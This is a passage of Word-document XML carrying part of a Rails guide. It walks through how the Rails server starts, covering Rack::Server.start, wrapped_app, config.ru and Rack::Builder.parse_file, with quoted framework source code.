          <w:p w14:paraId="0D357660" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="570B098E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D7A6DC4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  super</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CD1E899" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ensure</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BD4FABD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # The '-h' option calls exit before @options is set.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14A4179A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # If we call 'options' with it unset, we get double help banners.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="762A3AD8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  puts 'Exiting'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@options</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&amp;&amp; options[:daemonize]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D2070BF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="321669D0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is where the first output of the Rails initialization happens. This method creates a trap for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>INT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> signals, so if you </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>CTRL</w:t>
      </w:r>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t xml:space="preserve"> the server, it will exit the process. As we can see from the code here, it will create the </w:t>
      </w:r>
      <w:r>
        <w:t>tmp/cache</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t>tmp/pids</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t>tmp/sessions</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:t>tmp/sockets</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t xml:space="preserve"> directories if they don't already exist prior to calling </w:t>
      </w:r>
      <w:r>
        <w:t>super</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:r>
        <w:t>super</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t xml:space="preserve"> method will call </w:t>
      </w:r>
      <w:r>
        <w:t>Rack::Server.start+ which begins its definition like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="02202762" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="20E61F50" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>start</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="374C163B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options[:warn]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CFDAAEC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    $-w = true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A93299B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AAFDB2D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77782C34" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>includes = options[:include]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5844C571" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    $LOAD_PATH.unshift(*includes)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6157784F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73AF5CFE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="298F6480" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>library = options[:require]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D0F4F73" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    require library</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F67DD85" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EAA2323" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4012DE2A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options[:debug]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EE1D30A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    $DEBUG</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="286A020C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    require 'pp'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05DD50EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    p options[:server]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1675F096" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    pp wrapped_app</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="459B5A39" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    pp app</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73E10B3B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B78BE10" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26939D97" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In a Rails application, these options are not set at all and therefore aren’t used at all. The first line of code that’s executed in this method is a call to this method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1F6F94F3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08116C2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1685783118"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>wrapped_app</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="16B1F443" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This method calls another method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3528"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="15197568" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43F47AD7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="853609560"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@wrapped_app</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>||= build_app app</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0CB9CE75" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Then the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method here is defined like so:</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C4671F7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F321068" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>app</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EAC3E92" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @app</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>||= begin</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40E94A3F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>!::File.exist? options[:config]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50D2193E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      abort "configuration #{options[:config]} not found"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="271F4EDE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77217156" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5905F683" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    app, options = Rack::Builder.parse_file(self.options[:config], opt_parser)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54CEEC9C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    self.options.merge! options</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21580187" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    app</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="483F5E40" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="420F9EA8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="658EEFE3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>options[:config]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> value defaults to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.ru</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which contains this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="79C89343" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3795CBAE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># This file is used by Rack-based servers to start the application.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08B3A17D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E46F2A0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require ::File.expand_path('../config/environment',  __FILE__)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32D6E980" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>run YourApp::Application</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1EC66149" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack::Builder.parse_file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method here takes the content from this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.ru</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file and parses it using this code:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7368"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="232FE319" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B8EEF62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>app = eval "Rack::Builder.new {( "</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+ cfgfile + "\n )}.to_app",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75824F7A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    TOPLEVEL_BINDING, config</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F27FF95" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initialize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method will take the block here and execute it within an instance of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack::Builder</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This is where the majority of the initialization process of Rails happens. The chain of events that this simple line sets off will be the focus of a large majority of this guide. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>require</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> line for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/environment.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.ru</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the first to run:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
